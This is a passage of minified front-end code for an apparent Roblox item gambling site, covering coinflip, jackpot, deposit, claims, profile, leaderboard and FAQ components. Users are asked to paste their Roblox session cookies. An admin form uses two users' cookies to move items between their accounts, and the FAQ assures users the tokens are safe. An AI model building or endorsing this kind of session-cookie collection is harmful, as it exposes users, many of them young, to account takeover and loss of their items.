                            return e.preventDefault(), t.linkAccount(e)
                        }
                    }
                }, [r("div", {
                    staticClass: "input__group"
                }, [r("div", {
                    staticClass: "group__icon"
                }, [r("FontAwesomeIcon", {
                    attrs: {
                        icon: ["fas", "cookie"]
                    }
                })], 1), t._v(" "), r("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: t.login.credentials,
                        expression: "login.credentials"
                    }],
                    staticClass: "group__field",
                    attrs: {
                        type: "password",
                        placeholder: "Your cookie",
                        id: "input"
                    },
                    domProps: {
                        value: t.login.credentials
                    },
                    on: {
                        input: function(e) {
                            e.target.composing || t.$set(t.login, "credentials", e.target.value)
                        }
                    }
                })]), t._v(" "), r("input", {
                    staticClass: "btn btn-blue btn-pill mt-2",
                    attrs: {
                        disabled: t.disabled,
                        type: "submit",
                        value: "Link",
                        id: "output"
                    }
                })])])])
            }), [], !1, null, "79e09df2", null)),
            F = M.exports;
        installComponents(M, {
            ModalContainer: r(60).default
        });
        r(69), r(35), r(59);
        var V = {
                name: "BetModal",
                middleware: "auth",
                data: function() {
                    return {
                        disabled: !1,
                        bet: {
                            option: "Heads",
                            userAssets: []
                        }
                    }
                },
                computed: {
                    totalValue: function() {
                        return this.bet.userAssets.reduce((function(t, e) {
                            return t + e.marketValue
                        }), 0)
                    },
                    minValue: function() {
                        var t = parseInt(this.$route.query.min, 10);
                        return isNaN(t) && (t = 1e3), t
                    },
                    maxValue: function() {
                        var t = parseInt(this.$route.query.max, 10);
                        return isNaN(t) && (t = 1 / 0), t
                    }
                },
                methods: {
                    createOrJoinCoinflip: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            var r;
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        if (e.prev = 0, t.disabled = !0, !(t.totalValue < 1e3)) {
                                            e.next = 4;
                                            break
                                        }
                                        throw new Error("The total value must be at least R$ 1,000");
                                    case 4:
                                        if (!(t.totalValue < t.minValue)) {
                                            e.next = 6;
                                            break
                                        }
                                        throw new Error("Not enough value");
                                    case 6:
                                        if (!(t.totalValue > t.maxValue)) {
                                            e.next = 8;
                                            break
                                        }
                                        throw new Error("Too much value");
                                    case 8:
                                        if (!(t.bet.userAssets.length < 1)) {
                                            e.next = 10;
                                            break
                                        }
                                        throw new Error("Not enough items");
                                    case 10:
                                        if (!(t.bet.userAssets.length > 6)) {
                                            e.next = 12;
                                            break
                                        }
                                        throw new Error("Too many items");
                                    case 12:
                                        if (t.$toast.info("Submitting items ..."), !t.$route.query.coinflipId) {
                                            e.next = 19;
                                            break
                                        }
                                        return e.next = 16, t.$axios.$put("coinflips/".concat(t.$route.query.coinflipId), t.bet);
                                    case 16:
                                        r = e.sent, e.next = 22;
                                        break;
                                    case 19:
                                        return e.next = 21, t.$axios.$post("coinflips", t.bet);
                                    case 21:
                                        r = e.sent;
                                    case 22:
                                        t.$toast.success("Success!"), t.$router.replace("/coinflips/active/".concat(r.data.coinflipId)), e.next = 30;
                                        break;
                                    case 26:
                                        e.prev = 26, e.t0 = e.catch(0), t.$toast.error(e.t0.response ? e.t0.response.data.error : e.t0.message), t.disabled = !1;
                                    case 30:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 26]
                            ])
                        })))()
                    }
                }
            },
            z = (r(345), Object(C.a)(V, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("ModalContainer", [r("div", {
                    staticClass: "bet"
                }, [r("div", {
                    staticClass: "bet__option-selector"
                }, [r("h1", {
                    staticClass: "title"
                }, [t._v("Choose Your Option")]), t._v(" "), r("OptionSelector", {
                    attrs: {
                        "locked-option": t.$route.query.option
                    },
                    model: {
                        value: t.bet.option,
                        callback: function(e) {
                            t.$set(t.bet, "option", e)
                        },
                        expression: "bet.option"
                    }
                })], 1), t._v(" "), r("div", {
                    staticClass: "bet__user-asset-selector"
                }, [r("h1", {
                    staticClass: "title"
                }, [t._v("Select Your Items")]), t._v(" "), r("p", {
                    staticClass: "subtitle"
                }, [t._v("Choose at least a single item worth R$ 1,000 or more")]), t._v(" "), r("span", [t._v("Current Value:")]), t._v(" "), r("span", {
                    staticClass: "current-value"
                }, [t._v("R$ " + t._s(t._f("longNumber")(t.totalValue)))]), t._v(" "), t.minValue && t.maxValue && t.maxValue != 1 / 0 ? r("div", [r("span", [t._v("Min Value:")]), t._v(" "), r("span", {
                    staticClass: "min-value"
                }, [t._v("R$ " + t._s(t._f("longNumber")(t.minValue)))]), t._v(" "), r("span", [t._v("Max Value:")]), t._v(" "), r("span", {
                    staticClass: "max-value"
                }, [t._v("R$ " + t._s(t._f("longNumber")(t.maxValue)))])]) : t._e(), t._v(" "), r("UserAssetSelector", {
                    attrs: {
                        "user-id": t.$auth.user._id,
                        "max-items": 6
                    },
                    model: {
                        value: t.bet.userAssets,
                        callback: function(e) {
                            t.$set(t.bet, "userAssets", e)
                        },
                        expression: "bet.userAssets"
                    }
                })], 1), t._v(" "), r("div", {
                    staticClass: "bet__controls"
                }, [r("button", {
                    staticClass: "btn btn-blue btn-full",
                    attrs: {
                        disabled: t.disabled
                    },
                    on: {
                        click: function(e) {
                            return t.createOrJoinCoinflip()
                        }
                    }
                }, [t._v("Submit")])])])])
            }), [], !1, null, "12ea7b0b", null)),
            W = z.exports;
        installComponents(z, {
            OptionSelector: r(431).default,
            UserAssetSelector: r(184).default,
            ModalContainer: r(60).default
        });
        var B = {
                name: "DepositModal",
                middleware: "auth",
                data: function() {
                    return {
                        disabled: !1,
                        deposit: {
                            userAssets: []
                        }
                    }
                },
                computed: {
                    totalValue: function() {
                        return this.deposit.userAssets.reduce((function(t, e) {
                            return t + e.marketValue
                        }), 0)
                    }
                },
                methods: {
                    depositUserAssets: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        if (e.prev = 0, t.disabled = !0, !(t.totalValue < 1e3)) {
                                            e.next = 4;
                                            break
                                        }
                                        throw new Error("The total value must be at least R$ 1,000");
                                    case 4:
                                        if (!(t.deposit.userAssets.length < 1)) {
                                            e.next = 6;
                                            break
                                        }
                                        throw new Error("Not enough items");
                                    case 6:
                                        if (!(t.deposit.userAssets.length > 3)) {
                                            e.next = 8;
                                            break
                                        }
                                        throw new Error("Too many items");
                                    case 8:
                                        return e.next = 10, t.$axios.$put("jackpot", t.deposit);
                                    case 10:
                                        t.$toast.info("You have been placed into the jackpot queue, please be patient..."), t.$router.replace("/jackpot"), e.next = 18;
                                        break;
                                    case 14:
                                        e.prev = 14, e.t0 = e.catch(0), t.$toast.error(e.t0.response ? e.t0.response.data.error : e.t0.message), t.disabled = !1;
                                    case 18:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 14]
                            ])
                        })))()
                    }
                }
            },
            J = (r(355), Object(C.a)(B, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("ModalContainer", [r("div", {
                    staticClass: "deposit"
                }, [r("div", {
                    staticClass: "deposit__user-asset-selector"
                }, [r("h1", {
                    staticClass: "title"
                }, [t._v("Select Your Items")]), t._v(" "), r("p", {
                    staticClass: "subtitle"
                }, [t._v("Up to three items with a minimum of R$ 1,000")]), t._v(" "), r("span", [t._v("Current Value:")]), t._v(" "), r("span", {
                    staticClass: "current-value"
                }, [t._v("R$ " + t._s(t._f("longNumber")(t.totalValue)))]), t._v(" "), r("UserAssetSelector", {
                    attrs: {
                        "user-id": t.$auth.user._id,
                        "max-items": 3
                    },
                    model: {
                        value: t.deposit.userAssets,
                        callback: function(e) {
                            t.$set(t.deposit, "userAssets", e)
                        },
                        expression: "deposit.userAssets"
                    }
                })], 1), t._v(" "), r("div", {
                    staticClass: "deposit__controls"
                }, [r("button", {
                    staticClass: "btn btn-blue btn-full",
                    attrs: {
                        disabled: t.disabled
                    },
                    on: {
                        click: t.depositUserAssets
                    }
                }, [t._v("Submit")])])])])
            }), [], !1, null, "bf9bade6", null)),
            G = J.exports;
        installComponents(J, {
            UserAssetSelector: r(184).default,
            ModalContainer: r(60).default
        });
        var Y = {
                middleware: "auth",
                data: function() {
                    return {
                        disabled: !1,
                        claims: null
                    }
                },
                methods: {
                    claimUserAssets: function(t) {
                        var e = this;
                        return Object(n.a)(regeneratorRuntime.mark((function r() {
                            return regeneratorRuntime.wrap((function(r) {
                                for (;;) switch (r.prev = r.next) {
                                    case 0:
                                        return r.prev = 0, e.disabled = !0, e.$toast.info("Your claim is being resolved, please wait ..."), r.next = 5, e.$axios.$delete("users/".concat(e.$auth.user._id, "/claims/").concat(t._id));
                                    case 5:
                                        e.$toast.success("Success!"), e.$refs.fetchContainer.$fetch(), r.next = 13;
                                        break;
                                    case 9:
                                        r.prev = 9, r.t0 = r.catch(0), console.error(r.t0), e.$toast.error(r.t0.response ? r.t0.response.data.error : r.t0.message);
                                    case 13:
                                        return r.prev = 13, e.disabled = !1, r.finish(13);
                                    case 16:
                                    case "end":
                                        return r.stop()
                                }
                            }), r, null, [
                                [0, 9, 13, 16]
                            ])
                        })))()
                    }
                }
            },
            K = (r(357), Object(C.a)(Y, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("FetchContainer", {
                    ref: "fetchContainer",
                    attrs: {
                        path: "users/" + t.$auth.user._id + "/claims",
                        property: "storageClaims"
                    },
                    model: {
                        value: t.claims,
                        callback: function(e) {
                            t.claims = e
                        },
                        expression: "claims"
                    }
                }, [t.claims ? r("div", [r("p", [t._v("Claims are made when you were unable to receive your items due to errors regarding the trade. You will see claims here that are either for refunds or to receive your winnings")]), t._v(" "), r("p", [t._v("It is imperative that you check this frequently because we swap our storage bots every 2-3 days and if we no longer have access to them you will "), r("b", [t._v("NOT")]), t._v(" be refunded!")]), t._v(" "), r("ul", {
                    staticClass: "claims__list"
                }, t._l(t.claims, (function(e, i) {
                    return r("li", {
                        key: i,
                        staticClass: "list__item"
                    }, [r("StatListItem", {
                        attrs: {
                            label: "Current Value",
                            prefix: "R$",
                            value: e.currentValue
                        }
                    }), t._v(" "), r("StatListItem", {
                        attrs: {
                            label: "Original Value",
                            prefix: "R$",
                            value: e.originalValue
                        }
                    }), t._v(" "), r("div", {
                        staticClass: "item__data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Claim ID")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [r("span", [t._v(t._s(e._id))])])]), t._v(" "), r("div", {
                        staticClass: "item__data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Bot ID")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [r("span", [t._v(t._s(e.storageAccountId))])])]), t._v(" "), r("div", {
                        staticClass: "item__data"
                    }, [r("span", {
                        staticClass: "data__label"
                    }, [t._v("Created At")]), t._v(" "), r("span", {
                        staticClass: "data__value"
                    }, [r("span", [t._v(t._s(new Date(e.createdAt).toUTCString()))])])]), t._v(" "), r("div", [r("button", {
                        staticClass: "btn btn-gray btn-full",
                        attrs: {
                            disabled: t.disabled
                        },
                        on: {
                            click: function(r) {
                                return t.claimUserAssets(e)
                            }
                        }
                    }, [t._v("Claim")])])], 1)
                })), 0)]) : t._e()])
            }), [], !1, null, "1b2451a6", null)),
            H = K.exports;
        installComponents(K, {
            StatListItem: r(99).default,
            FetchContainer: r(61).default
        });
        var X = {
                data: function() {
                    return {
                        profile: null,
                        map: [{
                            key: "betValue",
                            label: "Bet In Value",
                            prefix: "R$ "
                        }, {
                            key: "profitValue",
                            label: "Profit In Value",
                            prefix: "R$"
                        }, {
                            key: "gamesPlayed",
                            label: "Games Played"
                        }]
                    }
                },
                computed: {
                    shareUrl: function() {
                        return "https://rbxflip.com/profiles/".concat(this.profile._id)
                    },
                    twitterUrl: function() {
                        var text = encodeURI("Check out my profile on RbxFlip!");
                        return "https://twitter.com/intent/tweet?hashtags=".concat("rbxflip", "&text=").concat(text, "&url=").concat(this.shareUrl)
                    }
                }
            },
            Q = (r(362), Object(C.a)(X, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("FetchContainer", {
                    attrs: {
                        property: "profile",
                        path: "users/" + t.$route.params.userId + "/profile"
                    },
                    model: {
                        value: t.profile,
                        callback: function(e) {
                            t.profile = e
                        },
                        expression: "profile"
                    }
                }, [t.profile ? r("div", {
                    staticClass: "user-profile"
                }, [r("div", {
                    staticClass: "user-profile__info"
                }, [r("div", {
                    staticClass: "info__user"
                }, [r("div", {
                    staticClass: "user__data"
                }, [r("a", {
                    staticClass: "data__name",
                    attrs: {
                        href: "https://rolimons.com/player/" + t.profile._id,
                        target: "_blank"
                    }
                }, [t._v(t._s(t.profile.username))]), t._v(" "), r("div", {
                    staticClass: "data__id"
                }, [t._v("(" + t._s(t.profile._id) + ")")]), t._v(" "), r("div", {
                    staticClass: "info__buttons"
                }, [r("NuxtLink", {
                    staticClass: "btn btn-gray btn-pill",
                    attrs: {
                        to: "/coinflips/history/" + t.profile._id
                    }
                }, [t._v("Coinflips")]), t._v(" "), r("NuxtLink", {
                    staticClass: "btn btn-gray btn-pill",
                    attrs: {
                        to: "/jackpot/history/" + t.profile._id
                    }
                }, [t._v("Jackpots")]), t._v(" "), t.$auth.loggedIn && t.$auth.user._id == t.profile._id ? r("NuxtLink", {
                    staticClass: "btn btn-gray btn-pill",
                    attrs: {
                        to: "/claims"
                    }
                }, [t._v("Claims")]) : t._e()], 1)]), t._v(" "), r("div", {
                    staticClass: "user__image-holder"
                }, [r("img", {
                    staticClass: "image-holder__image",
                    attrs: {
                        width: "110px",
                        src: t.$util.getUserThumbnail(t.profile._id)
                    }
                })])]), t._v(" "), r("StatList", {
                    attrs: {
                        map: t.map,
                        data: t.profile
                    }
                })], 1), t._v(" "), r("MediaLinks", {
                    attrs: {
                        "twitter-url": t.twitterUrl,
                        "share-url": t.shareUrl
                    }
                })], 1) : t._e()])
            }), [], !1, null, "e578885a", null)),
            Z = Q.exports;
        installComponents(Q, {
            StatList: r(183).default,
            MediaLinks: r(185).default,
            FetchContainer: r(61).default
        });
        var tt = {
                middleware: "admin",
                data: function() {
                    return {
                        disabled: !1,
                        exchange: {
                            sender: {
                                userId: 0,
                                credentials: "",
                                userAssets: []
                            },
                            receiver: {
                                userId: 0,
                                credentials: "",
                                userAssets: []
                            }
                        }
                    }
                },
                methods: {
                    exchangeAssets: function() {
                        var t = this;
                        return Object(n.a)(regeneratorRuntime.mark((function e() {
                            return regeneratorRuntime.wrap((function(e) {
                                for (;;) switch (e.prev = e.next) {
                                    case 0:
                                        return e.prev = 0, t.disabled = !0, e.next = 4, t.$axios.$post("users/exchange", t.exchange);
                                    case 4:
                                        t.$toast.success("Success!"), e.next = 11;
                                        break;
                                    case 7:
                                        e.prev = 7, e.t0 = e.catch(0), console.error(e.t0), t.$toast.error(e.t0.error);
                                    case 11:
                                        return e.prev = 11, t.disabled = !1, e.finish(11);
                                    case 14:
                                    case "end":
                                        return e.stop()
                                }
                            }), e, null, [
                                [0, 7, 11, 14]
                            ])
                        })))()
                    }
                }
            },
            et = (r(366), Object(C.a)(tt, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("ModalContainer", [r("div", {
                    staticClass: "exchange"
                }, [r("h1", {
                    staticClass: "exchange__title"
                }, [t._v("Single trades only")]), t._v(" "), r("div", {
                    staticClass: "exchange__forms"
                }, [r("div", {
                    staticClass: "forms__item"
                }, [r("h1", {
                    staticClass: "item__title"
                }, [t._v("Sender")]), t._v(" "), r("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: t.exchange.sender.userId,
                        expression: "exchange.sender.userId"
                    }],
                    staticClass: "form-input form-input-dark",
                    attrs: {
                        type: "text",
                        placeholder: "User ID"
                    },
                    domProps: {
                        value: t.exchange.sender.userId
                    },
                    on: {
                        input: function(e) {
                            e.target.composing || t.$set(t.exchange.sender, "userId", e.target.value)
                        }
                    }
                }), t._v(" "), r("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: t.exchange.sender.credentials,
                        expression: "exchange.sender.credentials"
                    }],
                    staticClass: "form-input form-input-dark",
                    attrs: {
                        type: "text",
                        placeholder: "Roblox cookie"
                    },
                    domProps: {
                        value: t.exchange.sender.credentials
                    },
                    on: {
                        input: function(e) {
                            e.target.composing || t.$set(t.exchange.sender, "credentials", e.target.value)
                        }
                    }
                }), t._v(" "), r("UserAssetSelector", {
                    attrs: {
                        "max-items": 4,
                        "intangibles-selectable": !0,
                        "user-id": t.exchange.sender.userId
                    },
                    model: {
                        value: t.exchange.sender.userAssets,
                        callback: function(e) {
                            t.$set(t.exchange.sender, "userAssets", e)
                        },
                        expression: "exchange.sender.userAssets"
                    }
                })], 1), t._v(" "), r("div", {
                    staticClass: "forms__item"
                }, [r("h1", {
                    staticClass: "item__title"
                }, [t._v("Receiver")]), t._v(" "), r("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: t.exchange.receiver.userId,
                        expression: "exchange.receiver.userId"
                    }],
                    staticClass: "form-input form-input-dark",
                    attrs: {
                        type: "text",
                        placeholder: "User ID"
                    },
                    domProps: {
                        value: t.exchange.receiver.userId
                    },
                    on: {
                        input: function(e) {
                            e.target.composing || t.$set(t.exchange.receiver, "userId", e.target.value)
                        }
                    }
                }), t._v(" "), r("input", {
                    directives: [{
                        name: "model",
                        rawName: "v-model",
                        value: t.exchange.receiver.credentials,
                        expression: "exchange.receiver.credentials"
                    }],
                    staticClass: "form-input form-input-dark",
                    attrs: {
                        type: "text",
                        placeholder: "Roblox cookie"
                    },
                    domProps: {
                        value: t.exchange.receiver.credentials
                    },
                    on: {
                        input: function(e) {
                            e.target.composing || t.$set(t.exchange.receiver, "credentials", e.target.value)
                        }
                    }
                }), t._v(" "), r("UserAssetSelector", {
                    attrs: {
                        "max-items": 4,
                        "intangibles-selectable": !0,
                        "user-id": t.exchange.receiver.userId
                    },
                    model: {
                        value: t.exchange.receiver.userAssets,
                        callback: function(e) {
                            t.$set(t.exchange.receiver, "userAssets", e)
                        },
                        expression: "exchange.receiver.userAssets"
                    }
                })], 1)]), t._v(" "), r("div", [r("button", {
                    staticClass: "btn btn-gray btn-full",
                    attrs: {
                        disabled: t.disabled
                    },
                    on: {
                        click: t.exchangeAssets
                    }
                }, [t._v("Exchange")])])])])
            }), [], !1, null, "61f24650", null)),
            at = et.exports;
        installComponents(et, {
            UserAssetSelector: r(184).default,
            ModalContainer: r(60).default
        });
        var it = {
                data: function() {
                    return {
                        jackpots: null
                    }
                }
            },
            nt = (r(368), Object(C.a)(it, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("FetchContainer", {
                    attrs: {
                        property: "jackpots",
                        path: "history/jackpots/" + t.$route.params.userId
                    },
                    model: {
                        value: t.jackpots,
                        callback: function(e) {
                            t.jackpots = e
                        },
                        expression: "jackpots"
                    }
                }, [t.jackpots ? r("div", [r("ul", {
                    staticClass: "user-jackpot-history-list"
                }, t._l(t.jackpots, (function(t) {
                    return r("JackpotHistoryListItem", {
                        key: t._id,
                        staticClass: "user-jackpot-history-list__item",
                        attrs: {
                            jackpot: t
                        }
                    })
                })), 1)]) : t._e()])
            }), [], !1, null, "c30cab2a", null)),
            ot = nt.exports;
        installComponents(nt, {
            JackpotHistoryListItem: r(246).default,
            FetchContainer: r(61).default
        });
        var st = {
                data: function() {
                    return {
                        coinflips: null
                    }
                }
            },
            ct = (r(370), Object(C.a)(st, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("FetchContainer", {
                    attrs: {
                        property: "coinflips",
                        path: "history/coinflips/" + t.$route.params.userId
                    },
                    model: {
                        value: t.coinflips,
                        callback: function(e) {
                            t.coinflips = e
                        },
                        expression: "coinflips"
                    }
                }, [t.coinflips ? r("div", [r("ul", {
                    staticClass: "user-coinflip-history-list"
                }, t._l(t.coinflips, (function(t) {
                    return r("CoinflipListItem", {
                        key: t._id,
                        staticClass: "user-coinflip-history-list__item",
                        attrs: {
                            coinflip: t
                        }
                    })
                })), 1)]) : t._e()])
            }), [], !1, null, "5cacb4d3", null)),
            lt = ct.exports;
        installComponents(ct, {
            CoinflipListItem: r(182).default,
            FetchContainer: r(61).default
        });

        function ut(object, t) {
            var e = Object.keys(object);
            if (Object.getOwnPropertySymbols) {
                var r = Object.getOwnPropertySymbols(object);
                t && (r = r.filter((function(t) {
                    return Object.getOwnPropertyDescriptor(object, t).enumerable
                }))), e.push.apply(e, r)
            }
            return e
        }

        function pt(t) {
            for (var i = 1; i < arguments.length; i++) {
                var source = null != arguments[i] ? arguments[i] : {};
                i % 2 ? ut(Object(source), !0).forEach((function(e) {
                    Object(o.a)(t, e, source[e])
                })) : Object.getOwnPropertyDescriptors ? Object.defineProperties(t, Object.getOwnPropertyDescriptors(source)) : ut(Object(source)).forEach((function(e) {
                    Object.defineProperty(t, e, Object.getOwnPropertyDescriptor(source, e))
                }))
            }
            return t
        }
        var ft = {
                data: function() {
                    return {
                        coinflip: null
                    }
                },
                watch: {
                    coinflip: function(t) {
                        null == t && this.getCoinflip()
                    }
                },
                computed: pt(pt({}, Object(x.d)(["coinflips"])), {}, {
                    shareUrl: function() {
                        return "https://rbxflip.com/coinflips/active/".concat(this.coinflip._id)
                    },
                    twitterUrl: function() {
                        var text = encodeURI("R$ ".concat(this.$util.toShortNumber(this.coinflip.totalValue), " bet on RbxFlip!"));
                        return "https://twitter.com/intent/tweet?hashtags=".concat("rbxflip", "&text=").concat(text, "&url=").concat(this.shareUrl)
                    }
                }),
                methods: {
                    getCoinflip: function() {
                        var t = this,
                            e = this.coinflips.find((function(e) {
                                return e._id === t.$route.params.coinflipId
                            }));
                        e ? this.coinflip = e : this.$router.replace("/coinflips/inactive/".concat(this.$route.params.coinflipId))
                    }
                },
                mounted: function() {
                    var t = this;
                    0 == this.coinflips.length ? setTimeout((function() {
                        return t.getCoinflip()
                    }), 2500) : this.getCoinflip()
                }
            },
            mt = Object(C.a)(ft, (function() {
                var t = this.$createElement,
                    e = this._self._c || t;
                return e("ModalContainer", [e("Brand", {
                    attrs: {
                        "logo-width": "200px",
                        "logo-version": "teritiary"
                    }
                }), this._v(" "), this.coinflip ? e("div", [e("CoinflipDisplay", {
                    attrs: {
                        coinflip: this.coinflip
                    }
                }), this._v(" "), e("MediaLinks", {
                    attrs: {
                        "twitter-url": this.twitterUrl,
                        "share-url": this.shareUrl
                    }
                })], 1) : e("div", [e("Spinner")], 1)], 1)
            }), [], !1, null, null, null),
            ht = mt.exports;
        installComponents(mt, {
            Brand: r(98).default,
            CoinflipDisplay: r(247).default,
            MediaLinks: r(185).default,
            Spinner: r(51).default,
            ModalContainer: r(60).default
        });
        var _t = {
                data: function() {
                    return {
                        coinflip: null
                    }
                },
                computed: {
                    shareUrl: function() {
                        return "https://rbxflip.com/coinflips/inactive/".concat(this.coinflip._id)
                    },
                    twitterUrl: function() {
                        var text = encodeURI("R$ ".concat(this.$util.toShortNumber(this.coinflip.totalValue), " bet on RbxFlip!"));
                        return "https://twitter.com/intent/tweet?hashtags=".concat("rbxflip", "&text=").concat(text, "&url=").concat(this.shareUrl)
                    }
                }
            },
            vt = Object(C.a)(_t, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("FetchContainer", {
                    attrs: {
                        name: "InactiveCoinflip",
                        property: "coinflip",
                        path: "coinflips/inactive/" + t.$route.params.coinflipId
                    },
                    model: {
                        value: t.coinflip,
                        callback: function(e) {
                            t.coinflip = e
                        },
                        expression: "coinflip"
                    }
                }, [t.coinflip ? r("div", [r("CoinflipDisplay", {
                    attrs: {
                        coinflip: t.coinflip
                    }
                }), t._v(" "), r("MediaLinks", {
                    attrs: {
                        "twitter-url": t.twitterUrl,
                        "share-url": t.shareUrl
                    }
                })], 1) : t._e()])
            }), [], !1, null, null, null),
            gt = vt.exports;
        installComponents(vt, {
            CoinflipDisplay: r(247).default,
            MediaLinks: r(185).default,
            FetchContainer: r(61).default
        });
        var bt = {
                data: function() {
                    return {
                        overview: null,
                        statMap: [{
                            key: "totalBetValue",
                            label: "Total Value",
                            prefix: "R$ "
                        }, {
                            key: "totalBetRAP",
                            label: "Total RAP",
                            prefix: "R$ "
                        }, {
                            key: "totalCoinflips",
                            label: "Coinflips"
                        }, {
                            key: "totalJackpots",
                            label: "Jackpots"
                        }]
                    }
                }
            },
            yt = (r(380), Object(C.a)(bt, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("FetchContainer", {
                    attrs: {
                        property: "overview",
                        path: "https://rbxflip.com/api/stats/overview"
                    },
                    model: {
                        value: t.overview,
                        callback: function(e) {
                            t.overview = e
                        },
                        expression: "overview"
                    }
                }, [t.overview ? r("ul", {
                    staticClass: "statistics"
                }, [r("li", {
                    staticClass: "statistics__biggest-games"
                }, [t.overview.biggestCoinflip ? r("div", [r("StatListItem", {
                    attrs: {
                        label: "Biggest Coinflip",
                        prefix: "R$",
                        value: t.overview.biggestCoinflip.totalValue
                    }
                })], 1) : t._e(), t._v(" "), t.overview.biggestJackpot ? r("div", [r("StatListItem", {
                    attrs: {
                        label: "Biggest Jackpot",
                        prefix: "R$",
                        value: t.overview.biggestJackpot.totalValue
                    }
                })], 1) : t._e()]), t._v(" "), t._l(t.statMap, (function(e, i) {
                    return r("StatListItem", {
                        key: i,
                        attrs: {
                            label: e.label,
                            prefix: e.prefix,
                            value: t.overview[e.key]
                        }
                    })
                }))], 2) : t._e()])
            }), [], !1, null, "913e5ac8", null)),
            xt = yt.exports;
        installComponents(yt, {
            StatListItem: r(99).default,
            FetchContainer: r(61).default
        });
        var wt = {
                data: function() {
                    return {
                        leaderboard: null
                    }
                }
            },
            kt = (r(382), Object(C.a)(wt, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("FetchContainer", {
                    attrs: {
                        property: "leaderboard",
                        path: "stats/leaderboard"
                    },
                    model: {
                        value: t.leaderboard,
                        callback: function(e) {
                            t.leaderboard = e
                        },
                        expression: "leaderboard"
                    }
                }, [t.leaderboard ? r("div", {
                    staticClass: "leaderboard"
                }, [r("ul", {
                    staticClass: "leaderboard__list"
                }, [r("li", {
                    staticClass: "list__item"
                }, [r("div", {
                    staticClass: "item__hash"
                }, [t._v("#")]), t._v(" "), r("div", {
                    staticClass: "item__username"
                }, [t._v("Username")]), t._v(" "), r("div", {
                    staticClass: "item__profit"
                }, [t._v("Profit")])]), t._v(" "), t._l(t.leaderboard, (function(e, i) {
                    return r("li", {
                        key: i
                    }, [r("div", {
                        staticClass: "list__item"
                    }, [r("div", {
                        staticClass: "item__hash isWhite"
                    }, [t._v(t._s(i + 1))]), t._v(" "), r("div", {
                        staticClass: "item__user"
                    }, [r("NuxtLink", {
                        attrs: {
                            to: "/profiles/" + e._id
                        }
                    }, [r("img", {
                        staticClass: "user__image",
                        attrs: {
                            src: t.$util.getUserThumbnail(e._id),
                            width: "40px"
                        }
                    }), t._v(" "), r("span", {
                        staticClass: "user__name"
                    }, [t._v(t._s(e.username))])])], 1), t._v(" "), r("div", {
                        staticClass: "item__profit"
                    }, [r("span", {
                        staticClass: "profit__value"
                    }, [t._v("R$ " + t._s(t._f("longNumber")(e.profitValue)))])])])])
                }))], 2)]) : t._e()])
            }), [], !1, null, "2ae7a4d3", null)),
            Ct = kt.exports;
        installComponents(kt, {
            FetchContainer: r(61).default
        });
        var At = {
                data: function() {
                    return {
                        coinflips: null
                    }
                }
            },
            jt = (r(384), Object(C.a)(At, (function() {
                var t = this,
                    e = t.$createElement,
                    r = t._self._c || e;
                return r("FetchContainer", {
                    attrs: {
                        path: "history/coinflips",
                        property: "coinflips"
                    },
                    model: {
                        value: t.coinflips,
                        callback: function(e) {
                            t.coinflips = e
                        },
                        expression: "coinflips"
                    }
                }, [t.coinflips ? r("div", [r("ul", {
                    staticClass: "coinflip-history-list"
                }, t._l(t.coinflips, (function(t) {
                    return r("CoinflipListItem", {
                        key: t._id,
                        staticClass: "coinflip-history-list__item",
                        attrs: {
                            coinflip: t
                        }
                    })
                })), 1)]) : t._e()])
            }), [], !1, null, "23b57cc0", null)),
            $t = jt.exports;
        installComponents(jt, {
            CoinflipListItem: r(182).default,
            FetchContainer: r(61).default
        });
        var Ot = {
                data: function() {
                    return {
                        faqs: [{
                            question: "What is RBXFlip?",
                            answer: "RBXFlip is a thrilling Roblox gambling website with two unique game-modes! Our Coinflip mode is peer 2 peer meaning there is no house involved, purely testing your luck against other players! In Jackpot you're able to win up to 15 items with a potential 15 other players putting their items at stake each round."
                        }, {
                            question: "What is my .ROBLOSECURITY used for?",
                            answer: "In order to automate all trades and for our website to function, we use your session token (.ROBLOSECURITY). Our bots do everything in real time, and ensures a trust-less system between all users."
                        }, {
                            question: "Are my cookies safe?",
                            answer: "Absolutely! We don't store any .ROBLOSECURITY tokens in our database, it's a all local in your own browser within a JWT."
                        }, {
                            question: "What are your fees / commission?",
                            answer: "Currently we take between 0-10% fees. 10% is the highest we will take if possible out of any individual game, the only caveat is jackpot in which we take 0-10% the total excluding what you joined with. We use an algorithm which calculates the highest possible items it may take (if any) which add up to 10% , but no more. It's entirely possible to gamble with 0% EV if we are unable to take any smaller items from the flip to cover fees!"
                        }, {
                            question: "What are the jackpot / coinflip game requirements? ",
                            bullets: ["You must have Premium membership", "You must have at least two smalls (items under 750 RAP)", "Only 1-6 items per Coinflip can be bet, and 1-3 for Jackpot", "Only items above R$ 1,000 RAP or value may be bet", "Your trade filter must be off to everyone", "Your trades must be enabled to everyone"]
                        }, {
                            question: 'What is a "Projected" item?',
